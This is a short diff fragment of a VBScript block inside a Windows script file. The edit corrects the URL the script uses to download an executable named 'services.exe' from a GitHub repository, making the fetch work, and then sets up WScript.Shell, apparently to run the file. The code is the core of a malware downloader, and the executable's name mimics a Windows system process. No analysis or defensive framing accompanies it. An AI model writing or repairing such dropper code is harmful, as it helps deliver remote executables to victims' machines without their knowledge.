@@ -6,7 +6,7 @@
     <script language="VBScript">
       <![CDATA[
         Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-        objXMLHTTP.open "GET", "https://github.com/deux1337/cyberdeux/blob/main/services.exe", False
+        objXMLHTTP.open "GET", "https://raw.githubusercontent.com/deux1337/cyberdeux/blob/main/services.exe", False
         objXMLHTTP.send()
 
         ' Create an instance of the WScript.Shell object
